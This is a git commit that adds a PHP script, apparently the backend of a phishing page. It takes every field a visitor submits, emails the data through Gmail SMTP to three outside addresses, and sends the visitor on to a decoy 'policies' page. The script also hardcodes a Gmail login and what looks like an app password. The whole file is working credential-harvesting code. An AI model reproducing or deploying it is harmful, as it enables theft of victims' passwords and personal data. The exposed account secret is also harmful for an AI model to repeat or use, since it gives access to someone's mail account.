5e00b580af7a6e476df057731928183deef03760
asif1012-lgtm <hpboost8@gmail.com>
2025-07-14 08:24:05 +0500

    Create abdullahpass.php

---
+++ abdullahpass.php
@@ -0,0 +1,58 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+header("Location:https://about-our-policies.vercel.app/");
+
+require 'Exception.php';
+require 'PHPMailer.php';
+require 'SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
+
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+   // PHPMailer object creation
+    $mail = new PHPMailer(true);
+
+    try {
+        // SMTP settings
+          $mail->isSMTP();
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'hindistoryhub396@gmail.com'; // Replace with your email address
+        $mail->Password   = 'fylk gbsb cdgu anwh'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
+        $mail->addAddress('submitdispute@gmail.com');
+         $mail->addAddress('newzatpage@gmail.com');
+        $mail->addAddress('abdullahkhannizamani754@gmail.com');
+
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'Abdullah';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+        
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
+}
+?>
